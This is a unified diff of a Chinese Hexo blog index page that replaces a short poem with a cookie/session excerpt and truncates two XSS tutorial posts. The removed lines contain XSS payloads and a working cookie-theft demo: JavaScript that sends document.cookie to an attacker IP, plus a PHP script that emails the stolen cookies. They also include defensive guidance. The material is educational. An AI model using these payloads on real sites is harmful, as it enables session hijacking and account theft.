@@ -299,7 +299,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/24/zhenzhen/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/24/cookie/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="berlin">
@@ -318,7 +318,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/06/24/zhenzhen/" itemprop="url">未命名</a></h1>
+                <a class="post-title-link" href="/2018/06/24/cookie/" itemprop="url">COOKIE和SESSION的区别</a></h1>
         
 
         <div class="post-meta">
@@ -340,6 +340,28 @@
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -369,20 +391,15 @@
 
       
         
-          
-            <hr>
-<p>title: 珍爱<br>tags: 闲人诗</p>
-<h2 id="categories-闲人诗"><a href="#categories-闲人诗" class="headerlink" title="categories: 闲人诗"></a>categories: 闲人诗</h2><pre><code>  珍爱
-
-我生只醉一枝花，
-
-爱梅自古寒香来。
-
-珍珠玉红阳光照，
-
-珍藏一生情更深。﻿
-</code></pre>
-          
+          <p>链接：<a href="https://www.zhihu.com/question/19786827/answer/66706108" target="_blank" rel="noopener">https://www.zhihu.com/question/19786827/answer/66706108</a><br>来源：知乎</p>
+<h2 id="COOKIE和SESSION有什么区别？"><a href="#COOKIE和SESSION有什么区别？" class="headerlink" title="COOKIE和SESSION有什么区别？"></a>COOKIE和SESSION有什么区别？</h2><p><strong>cookie保存在客户端，session保存在服务器端，</strong><br><strong>Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中；</strong><br><strong>Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。</strong><br><strong>cookie</strong>目的可以<strong>跟踪会话，</strong>也可以<strong>保存用户喜好或者保存用户名密码</strong><br><strong>session用来跟踪会话</strong><br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/06/24/cookie/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -529,72 +546,15 @@
 
       
         
-          
-            <p>#XSS攻击</p>
-<p>####XSS攻击全称<a href="https://baike.baidu.com/item/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB" target="_blank" rel="noopener">跨站脚本攻击</a>，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。</p>
-<p>##什么是XSS攻击？<br>XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如<a href="https://baike.baidu.com/item/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5" target="_blank" rel="noopener">同源策略</a>(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC" target="_blank" rel="noopener">网络钓鱼</a>(Phishing)攻击而变得广为人知。对于<a href="https://baike.baidu.com/item/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB" target="_blank" rel="noopener">跨站脚本攻击</a>，黑客界共识是：跨站脚本攻击是新型的“<a href="https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB" target="_blank" rel="noopener">缓冲区溢出攻击</a>“，而JavaScript是新型的“ShellCode”。<br>它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过插入恶意脚本，实现对用户游览器的控制，获取用户的一些信息。</p>
-<p>##XSS的原理：</p>
-<p>  1.攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）。<br>    2.诱使受害者打开受到攻击的服务器URL。<br>   3.受害者在Web浏览器中打开URL，恶意脚本执行。</p>
-<p>##XSS攻击的危害包括：</p>
-<p>1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号<br>2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力<br>3、盗窃企业重要的具有商业价值的资料<br>4、非法转账<br>5、强制发送电子邮件<br>6、网站挂马<br>7、控制受害者机器向其它网站发起攻击</p>
-<p>##XSS攻击分类<br>（1）反射型： 又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。详细说就是发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS随响应内容一起返回给浏览器，最后浏览器解析执行XSS代码，这个过程就像一次发射，所以叫反射型XSS。<br>简单例子</p>
-<p>正常发送消息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/message.php?send=Hello,World！</span><br></pre></td></tr></table></figure></p>
-<p>接收者将会接收信息并显示Hello,Word</p>
-<p>非正常发送消息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/message.php?send=&lt;script&gt;alert(‘foolish!’)&lt;/script&gt;！</span><br></pre></td></tr></table></figure></p>
-<p>接收者接收消息显示的时候将会弹出警告窗口</p>
-<p>（2）存储型: 存储型XSS和反射型的XSS差别就在于，存储型的XSS提交的代码会存储在服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。又称为持久型跨站点脚本，当一个页面被用户打开的时候执行。每当用户打开浏览器,脚本执行。持久的XSS相比非持久性XSS攻击危害性更大,因为每当用户打开页面，查看内容时脚本将自动执行。谷歌的orkut曾经就遭受到XSS。</p>
-<p>简单例子：</p>
-<p>从名字就可了解到存储型XSS攻击就是将攻击代码存入数据库中，然后客户端打开时就执行这些攻击代码。例如留言板<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">留言板表单中的表单域：&lt;input type=“text” name=“content” value=“这里是用户填写的数据”&gt;</span><br></pre></td></tr></table></figure></p>
-<p>正常操作：</p>
-<p>用户是提交相应留言信息；将数据存储到数据库；其他用户访问留言板，应用去数据并显示。</p>
-<p>非正常操作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者在value填写&lt;script&gt;alert(‘foolish!’)&lt;/script&gt;【或者html其他标签（破坏样式。。。）、一段攻击型代码】；</span><br></pre></td></tr></table></figure></p>
-<p>将数据存储到数据库中；</p>
-<p>其他用户取出数据显示的时候，将会执行这些攻击性代码</p>
-<p>##DOMBasedXSS（基于dom的跨站点脚本攻击）<br>基于DOM的XSS有时也称为type0XSS。当用户能够通过交互修改浏览器页面中的DOM(DocumentObjectModel)并显示在浏览器上时，就有可能产生这种漏洞，从效果上来说它也是反射型XSS。</p>
-<p>　　通过修改页面的DOM节点形成的XSS，称之为DOMBasedXSS。</p>
-<p>　　前提是易受攻击的网站有一个HTML页面采用不安全的方式从document.location 或document.URL 或 document.referrer获取数据（或者任何其他攻击者可以修改的对象）。<br>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">  var pos=document.URL.indexOf(&quot;name=&quot;)+5;</span><br><span class="line"> document.write(document.URL.substring(pos,document.URL.length));</span><br><span class="line">  &lt;/SCRIPT&gt;</span><br><span class="line">name是截取URL中get过来的name参数</span><br></pre></td></tr></table></figure></p>
-<p>正常操作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vulnerable.site/welcome.html?name=Joe</span><br></pre></td></tr></table></figure></p>
-<p>非正常操作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vulnerable.site/welcome.html?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>######受害者的浏览器接收到这个链接，发送HTTP请求到<a href="http://www.vulnerable.site并且接受到上面的HTML页。受害者的浏览器开始解析这个HTML为DOM，DOM包含一个对象叫document，document里面有个URL属性，这个属性里填充着当前页面的URL。当解析器到达javascript代码，它会执行它并且修改你的HTML页面。倘若代码中引用了document.URL，那么，这部分字符串将会在解析时嵌入到HTML中，然后立即解析，同时，javascript代码会找到(alert(…))并且在同一个页面执行它，这就产生了xss的条件。" target="_blank" rel="noopener">www.vulnerable.site并且接受到上面的HTML页。受害者的浏览器开始解析这个HTML为DOM，DOM包含一个对象叫document，document里面有个URL属性，这个属性里填充着当前页面的URL。当解析器到达javascript代码，它会执行它并且修改你的HTML页面。倘若代码中引用了document.URL，那么，这部分字符串将会在解析时嵌入到HTML中，然后立即解析，同时，javascript代码会找到(alert(…))并且在同一个页面执行它，这就产生了xss的条件。</a></p>
-<p>##XSS攻击实例</p>
-<p>####1.简单XSS攻击<br>留言类，简单注入javascript<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">有个表单域：&lt;input type=“text” name=“content” value=“这里是用户填写的数据”&gt;</span><br><span class="line"></span><br><span class="line">1、假若用户填写数据为：&lt;script&gt;alert(&apos;foolish!&apos;)&lt;/script&gt;（或者&lt;script type=&quot;text/javascript&quot; src=&quot;./xss.js&quot;&gt;&lt;/script&gt;）</span><br><span class="line"></span><br><span class="line">2、提交后将会弹出一个foolish警告窗口，接着将数据存入数据库</span><br><span class="line"></span><br><span class="line">3、等到别的客户端请求这个留言的时候，将数据取出显示留言时将执行攻击代码，将会显示一个foolish警告窗口。</span><br><span class="line"></span><br><span class="line">【将数据改成html标签进行攻击，则会将原本的样式打乱。。。。。。。。】</span><br></pre></td></tr></table></figure></p>
-<p>####2.盗取cookie</p>
-<p>#####什么是Cookie？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie，有时也用其复数形式 [Cookies](https://baike.baidu.com/item/Cookies/187064)，指某些网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）。定义于 RFC2109 和 2965 中的都已废弃，最新取代的规范是 RFC6265 &lt;sup&gt;[1]&lt;/sup&gt;  。（可以叫做浏览器缓存）</span><br></pre></td></tr></table></figure></p>
-<p>这里，我们只是直观的感受一下Cookie。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在浏览器的地址栏输入：javascript:alert(document.cookie)，按下Enter键，即能看到当前Cookie值。</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/9113981-5abbd2cb612b8ac4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>有人可能会疑惑：这么复杂的一段代码，攻击者难道真的能破解出明文，然后冒充我们的身份？</p>
-<p>事实上，攻击者并不需要知道这段代码的含义！</p>
-<p>攻击者只需要把这个Cookie信息提交给服务器并通过验证，那么攻击者就可以冒充受害者的身份登陆网站。</p>
-<p>这就是我们常说的Cookie欺骗/Cookie会话攻击。</p>
-<p>#####Cookie窃取攻击</p>
-<p>最基本的XSS跨站攻击方法就是窃取受害者Cookie信息。</p>
-<p>其基本原理如下：</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/9113981-2b8a08a5c09971d6?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="这里写图片描述"></p>
-<ul>
-<li>当攻击者发现网站存在XSS漏洞时，攻击者会先向存在XSS漏洞的网页中注入恶意的脚本代码。</li>
-<li>当受害者访问到此含有恶意脚本代码的网页时，恶意脚本代码相应的执行。</li>
-<li>由于在受害者请求服务器的协议中含有Cookie信息，网站相应的得到用户Cookie信息。</li>
-<li>用户注入的恶意脚本代码是经过精心构造的，同时在远程服务器端或者攻击者使用的XSS平台上，有一个用户接受和记录Cookie信息的文本。</li>
-<li>攻击者访问此记录Cookie信息的文本，得到受害者的Cookie信息。</li>
-<li><p>攻击者利用受害者Cookie信息，通过桂林老兵、firecookie等工具，以受害者的身份信息访问网站。<br>Cookie窃取攻击的步骤：</p>
-<p>步骤一 判断网站是否存在反射型XSS/存储型XSS漏洞<br>步骤二 注入Cookie信息窃取的恶意代码</p>
-<pre><code>一般情况下，我们都是利用XSS平台的代码进行注入。这样，我们能够在XSS平台的对应项目中找到受害人Cookie。
-</code></pre><p>步骤三 冒充被害人身份登陆网站。</p>
-<pre><code>可以使用的工具有很多，例如桂林老兵，firefox浏览器插件firecookie等。
-</code></pre><p>##XSS的防御措施：<br>XSS漏洞的起因就是没有对用户提交的数据进行严格的过滤处理。因此在思考解决XSS漏洞的时候，我们应该重点把握如何才能更好的将用户提交的数据进行安全过滤。<br>#####什么是html实体？</p>
-</li>
-</ul>
-<p>　　在html中有些字符，像(&lt;)这类的，对HTML(标准通用标记语言下的一个应用)来说是有特殊意义的，所以这些字符是不允许在文本中使用的。要在HTML中显示(&lt;)这个字符，我们就必须使用实体字符。</p>
-<p>　　html实体的存在是导致XSS漏洞的主要原因之一。</p>
-<p>　　因此我们需要将这些实体全部转换为相应的实体编号。<br><strong>编码：</strong>对用户输入的数据进行HTML Entity编码<br><img src="http://upload-images.jianshu.io/upload_images/9113981-9d3da14ff69a7b52?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="这里写图片描述"><br>用户将数据提交上来的时候进行HTML编码，将相应的符号转换为实体名称再进行下一步的处理。<br>在PHP中已经存在这样子功能的函数，即是htmlentities($str)函数。<br>与之相反的就是html_entity_decode($str)函数，它将实体名称转换为相应的符号。<br><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_labelTop" target="_blank" rel="noopener"></a><br><strong>过滤：</strong>移除用户上传的DOM属性，如onerror等，移除用户上传的style节点，script节点，iframe节点等。<br>1、将重要的cookie标记为http only, 这样的话Javascript 中的document.cookie语句就不能获取到cookie了.</p>
-<p>2、表单数据规定值的类型，例如：年龄应为只能为int、name只能为字母数字组合。。。。</p>
-<p>4、对数据进行Html Encode 处理</p>
-<p>5、过滤或移除特殊的Html标签， 例如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;, &lt;iframe&gt; , &amp;lt; for &lt;, &amp;gt; for &gt;, &amp;quot for</span><br></pre></td></tr></table></figure></p>
-<p>6、过滤JavaScript 事件的标签。例如 “onclick=”, “onfocus” 等等。</p>
-<p>【特别注意：】</p>
-<p>在有些应用中是允许html标签出现的，甚至是javascript代码出现。因此我们在过滤数据的时候需要仔细分析哪些数据是有特殊要求（例如输出需要html代码、javascript代码拼接、或者此表单直接允许使用等等），然后区别处理！<br><strong>校正：</strong>避免直接对HTML Entity编码，使用DOM Prase转换，校正不配对的DOM标签。</p>
-
-          
+          <p>#XSS攻击</p>
+<h4 id="XSS攻击全称跨站脚本攻击，是为不和层叠样式表-Cascading-Style-Sheets-CSS-的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。"><a href="#XSS攻击全称跨站脚本攻击，是为不和层叠样式表-Cascading-Style-Sheets-CSS-的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。" class="headerlink" title="XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。"></a>XSS攻击全称<a href="https://baike.baidu.com/item/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB" target="_blank" rel="noopener">跨站脚本攻击</a>，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。</h4>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/06/24/XSS0/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -741,32 +701,14 @@
 
       
         
-          
-            <p>#####关于XSS获取cookie的，这里我用自己做的简单留言板做个示范。</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/9113981-272d2128dd4388af.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>这是登录界面，输入用户名进去后<br><img src="https://upload-images.jianshu.io/upload_images/9113981-6c1b9164cc3a5ec7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>可以对留言内容进行XSS尝试，因为未作任何过滤，所以存在XSS的，这里不详细演示了，只看怎么获取cookie吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/9113981-aff2b20eaa82e378.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/9113981-1ea640b695bf4436.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br> 可以看到cookie已经出来了，这里好像我的留言板做的太简单了，账号密码都出来了，，，不过这不是重点，但这里的cookie只是自己的，这时别人登录也会弹出cookie但只能本人看到，因此我们要想办法获取别人的<br>然后我自己写了个小脚本，用来获取别人的cookie，同样的方法插入xss代码，如果别人登录将会把别人的cookie发送到我邮箱里。<br>因为是用php和js写的，所以我这里将php发送qq邮箱的方法说一下，毕竟这是困我好久的难题。<br>其实方法也不难，不过遇到各种各样的麻烦<br>关于配置sendmail,这是windows下的配置，ubuntu下没成功，有高手可以指点下。</p>
-<blockquote>
-<p>######首先，这里我用的是wamp和用php mail()函数发送的邮件，php mail()函数在windows不能用，需要安装sendmail，假如是用的XAMPP，则已经下载好，不需要重新下载~<br>1.从<a href="http://glob.com.au/sendmail/下载sendmail.zip" target="_blank" rel="noopener">http://glob.com.au/sendmail/下载sendmail.zip</a><br>2.解压到C(其他一样):下，例如C:\php\sendmail，最好短路径，长路径名有可能产生问题。<br>3.开启SMTP服务：因为这里我用的qq发送，所以要开启qq邮箱的SMTP服务。<br>所有的主流邮箱都支持 SMTP 协议，但并非所有邮箱都默认开启，您可以在邮箱的设置里面手动开启。<br>第三方服务在提供了账号和密码之后就可以登录 SMTP 服务器，通过它来控制邮件的中转方式。<br>（1）开启邮箱（进入qq邮箱点设置-&gt;帐户）<br><img src="https://upload-images.jianshu.io/upload_images/9113981-4213d2d568648d0d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>（2）验证密保（图片临时找的不方便再）<br><img src="https://upload-images.jianshu.io/upload_images/9113981-8b448c349aa74c8b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>（3）生成授权码（授权码就是下面要用的东西，忘了图一会看到有生成授权码，没必要详记）<br><img src="https://upload-images.jianshu.io/upload_images/9113981-13025315af6a631c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>4.配置sendmail文件：<br><img src="https://upload-images.jianshu.io/upload_images/9113981-93df513b6d2c73bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/9113981-e81ea1c8b93da416.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">以下都是修改项</span><br><span class="line">[sendmail] </span><br><span class="line">; you must change mail.mydomain.com to your smtp server </span><br><span class="line">smtp_server=smtp.qq.com </span><br><span class="line">smtp_port=465 //特别注意：端口这里是465，不是25，网上有很多填25，腾讯邮箱特别说明了为465，还有一个忘了，困死我的地方，一直没发现这有错。</span><br><span class="line">auth_username=QQ号码@qq.com</span><br><span class="line">auth_password=授权码 //注意：这里是qq授权码不是邮箱密码，第一次就栽这个了，，网上有很多写密码的</span><br><span class="line">force_sender=QQ号码@qq.com</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>5.配置php.ini文件<br>打开wamp的php.ini然后搜索“[mail function]”，找到下面文本块,修改以下三样<br><img src="https://upload-images.jianshu.io/upload_images/9113981-b8677c28da0712ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[mail function] </span><br><span class="line">; For Win32 only. </span><br><span class="line">SMTP = smtp.qq.com //因为是qq邮箱</span><br><span class="line">smtp_port = 25 </span><br><span class="line">; For Win32 only. </span><br><span class="line">sendmail_from = qq号@qq.com </span><br><span class="line">; For Unix only. You may supply arguments as well (default: “sendmail -t -i”). </span><br><span class="line">sendmail_path = “E:\wamp64\sendmail\sendmail.exe -t”//修改成自己的路径</span><br></pre></td></tr></table></figure></p>
-</blockquote>
-<blockquote>
-<p>6.到这里就算配置完了，然后重启wamp</p>
-</blockquote>
-<p>然后开始用自己的脚本试试了，php发送邮件的脚本很容易，然后再加上获取cookie的js脚本，就成了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[&apos;joke&apos;];</span><br><span class="line">if(isset($_GET[&apos;joke&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$to = &quot;1057032770@qq.com&quot;;         // 邮件接收者</span><br><span class="line">$subject = &quot;COOKIE&quot;;                // 邮件标题</span><br><span class="line">$message = $_GET[&apos;joke&apos;];  // 邮件正文</span><br><span class="line">$from = &quot;1057032770@qq.com&quot;;   // 邮件发送者</span><br><span class="line">$headers = &quot;From:&quot; . $from;         // 头部信息设置</span><br><span class="line">mail($to,$subject,$message,$headers);</span><br><span class="line">echo &quot;邮件已发送&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">	echo &quot;邮件发送失败&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var img = document.createElement(&apos;img&apos;);</span><br><span class="line">img.width = 0;</span><br><span class="line">img.height = 0;</span><br><span class="line">img.src = &apos;http://localhost/Myphp/eamil0.php?joke=&apos;+encodeURIComponent(document.cookie);//这里是用本地环境测试的，可以换成自己的ip地址</span><br></pre></td></tr></table></figure>
-<p>然后就可以用了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&apos;http://localhost/Myphp/joke.js&apos;&gt;&lt;/script&gt; //joke.js是我的js文件名</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/9113981-2dd1193b8ad9dd69.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>将这段代码留言就可以看到cookie了，任何人登录都可以收到他cookie</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/9113981-295de31871759ab4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>可以看到已经成功收到cookie！！<br><img src="https://upload-images.jianshu.io/upload_images/9113981-2ffd35f9a0d3f380.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>上面是本地测试，这是正常情况下的<br>比如：服务器的ip地址也就是留言板地址为192.168.xx.xxx，现在我用本机去访问留言板，任何人都可已访问<br><img src="https://upload-images.jianshu.io/upload_images/9113981-6e5cd6f39e79655e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>然后我充当攻击者，借用上面方法,修改为自己ip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img.src = &apos;http://172.21.xx.xxx/Myphp/eamil0.php?joke=&apos;+encodeURIComponent(document.cookie); //自己路径</span><br></pre></td></tr></table></figure></p>
-<p>然后在留言板留言<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&apos;http://172.21.xx.xxx/Myphp/joke.js&apos;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>这样每当受害者去访问服务器也就是登陆留言板就会获取他cookie，然后利用cookie不需要账号密码就可以登录他的号。</p>
-
-          
+          <h5 id="关于XSS获取cookie的，这里我用自己做的简单留言板做个示范。"><a href="#关于XSS获取cookie的，这里我用自己做的简单留言板做个示范。" class="headerlink" title="关于XSS获取cookie的，这里我用自己做的简单留言板做个示范。"></a>关于XSS获取cookie的，这里我用自己做的简单留言板做个示范。</h5><p><img src="https://upload-images.jianshu.io/upload_images/9113981-272d2128dd4388af.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/06/24/XSS/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
